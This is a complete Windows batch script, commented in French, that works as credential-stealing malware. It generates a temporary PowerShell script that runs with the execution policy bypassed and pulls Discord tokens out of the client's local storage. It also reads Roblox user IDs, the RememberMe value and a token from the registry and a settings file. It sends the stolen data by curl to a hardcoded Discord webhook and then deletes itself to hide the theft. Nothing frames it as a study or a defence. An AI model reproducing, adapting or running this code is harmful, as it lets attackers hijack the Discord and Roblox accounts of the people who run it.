@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION FINALE (POWERSHELL ROBUSTE)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREATION D'UN SCRIPT POWERSHELL TEMPORAIRE POUR EXTRAIRE LES TOKENS
set "psfile=%TEMP%\extract.ps1"
(
echo $paths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo foreach ($p in $paths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -Filter *.log ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern '[a-zA-Z0-9_\-]{24,28}\.[a-zA-Z0-9_\-]{6,7}\.[a-zA-Z0-9_\-]{27,38}' -AllMatches ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens -join ' '
) > "%psfile%"

:: ETAPE 2 : EXECUTER LE SCRIPT POWERSHELL ET RECUPERER LA SORTIE
for /f "delims=" %%a in ('powershell -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2^>nul') do set "tokens=%%a"
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 3 : RECUPERATION DES DONNEES ROBLOX (registre + fichier XML)
set "roblox_user="
set "roblox_pass="
set "roblox_token="
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
if exist "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" (
  for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" 2^>nul') do set "roblox_token=%%a"
)

:: ETAPE 4 : CONSTRUCTION DU MESSAGE
set "msg="
if not "!tokens!"=="" set "msg=!msg!Tokens Discord : !tokens!\n"
if not "!roblox_user!"=="" set "msg=!msg!Roblox UserID : !roblox_user!\n"
if not "!roblox_pass!"=="" set "msg=!msg!Roblox RememberMe : !roblox_pass!\n"
if not "!roblox_token!"=="" set "msg=!msg!Roblox Token : !roblox_token!\n"
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: Echappement JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 5 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 6 : NETTOYAGE ET SUPPRESSION
set "tokens="
set "roblox_user="
set "roblox_pass="
set "roblox_token="
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
